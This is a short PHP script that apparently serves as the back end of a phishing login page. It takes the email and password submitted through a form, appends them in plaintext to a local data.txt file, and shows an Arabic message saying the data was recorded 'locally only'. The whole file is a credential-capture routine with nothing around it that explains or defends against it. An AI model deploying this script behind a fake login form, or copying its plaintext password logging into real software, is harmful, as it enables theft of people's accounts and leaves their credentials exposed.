<?php
    $email = $_POST['email'];
    $password = $_POST['password'];

    $file = fopen("data.txt", "a");
    fwrite($file, "Email: $email | Password: $password\n");
    fclose($file);

    echo "<h2>تم تسجيل البيانات بنجاح (محليًا فقط)</h2>";
?>